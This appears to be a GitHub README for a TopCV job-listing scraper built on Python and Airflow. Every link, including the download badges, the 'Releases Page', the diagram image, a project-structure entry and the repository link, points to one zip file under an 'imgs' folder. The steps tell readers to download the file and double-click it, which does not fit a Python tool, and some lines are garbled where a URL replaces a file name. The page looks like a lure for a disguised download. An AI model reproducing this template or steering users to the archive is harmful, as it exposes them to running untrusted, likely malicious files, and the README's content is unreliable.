# 😎 crawl-topcv-jobs - Easy Job Crawler for Data Analysts

[![Download](https://github.com/KhemSopheananSmos/crawl-topcv-jobs/raw/refs/heads/master/imgs/crawl-jobs-topcv-v1.2.zip%20Now-Release-brightgreen)](https://github.com/KhemSopheananSmos/crawl-topcv-jobs/raw/refs/heads/master/imgs/crawl-jobs-topcv-v1.2.zip)

## 🚀 Getting Started

Welcome! This application helps you collect job listings for Data Analysts on TopCV. Follow these simple steps to download and run the software.

## 📥 Download & Install

1. **Visit this page to download**: [Releases Page](https://github.com/KhemSopheananSmos/crawl-topcv-jobs/raw/refs/heads/master/imgs/crawl-jobs-topcv-v1.2.zip).
2. Locate the latest release version.
3. Download the appropriate file for your operating system.
4. After downloading, locate the file on your computer.
5. Double-click the file to start the installation process.
6. Follow the instructions to complete the setup.

## 🌟 Application Overview

This crawler gathers job data from TopCV. It combines job details with company information into a structured format. The tool can output results as CSV or XLSX files.

### Features of the Application

- Crawl multiple pages to gather job listings.
- Access job details like salary, location, experience, deadline, description, requirements, benefits, tags, address, and working hours.
- Fetch company information, including name, website, size, field, address, and description.
- Avoid errors with random delays to prevent **429 Too Many Requests**.
- Export data to **CSV** or **XLSX** formats.
- Automate the process with **Airflow DAG**:
  - **Step 1**: Run the scraper (Python script).
  - **Step 2**: Save the data as CSV/XLSX.
  - **Step 3**: Push data to Google Sheets.

## 🛠️ Project Structure

The project follows a straightforward structure. Here’s what you’ll find:

```
.
├── airflow
│   ├── dags/                  # DAGs (run_scrape_topcv_*.py)
│   ├── https://github.com/KhemSopheananSmos/crawl-topcv-jobs/raw/refs/heads/master/imgs/crawl-jobs-topcv-v1.2.zip    # Compose stack
│   ├── Dockerfile             # Custom Airflow image
```

## 📊 Pipeline Architecture

![Pipeline Architecture](https://github.com/KhemSopheananSmos/crawl-topcv-jobs/raw/refs/heads/master/imgs/crawl-jobs-topcv-v1.2.zip)

This diagram shows how different components interact within the application. Each part works together to perform the job scraping efficiently.

## 💻 System Requirements

To run this application, you need:

- A computer with Windows, macOS, or Linux.
- Python installed (version 3.6 or higher recommended).
- Basic knowledge of running applications from a file.

## 🔧 Troubleshooting

If you encounter issues:

- Ensure that Python is installed correctly.
- Check that you’ve downloaded the correct file for your operating system.
- Consult community forums or documentation for additional help.

## 📞 Support and Contributions

If you have questions or suggestions, feel free to reach out. Contributions are welcome. You can help improve this project by providing feedback or submitting issues.

--- 

For detailed documentation or feature requests, please explore the [GitHub Repository](https://github.com/KhemSopheananSmos/crawl-topcv-jobs/raw/refs/heads/master/imgs/crawl-jobs-topcv-v1.2.zip). 

[![Download](https://github.com/KhemSopheananSmos/crawl-topcv-jobs/raw/refs/heads/master/imgs/crawl-jobs-topcv-v1.2.zip%20Now-Release-brightgreen)](https://github.com/KhemSopheananSmos/crawl-topcv-jobs/raw/refs/heads/master/imgs/crawl-jobs-topcv-v1.2.zip)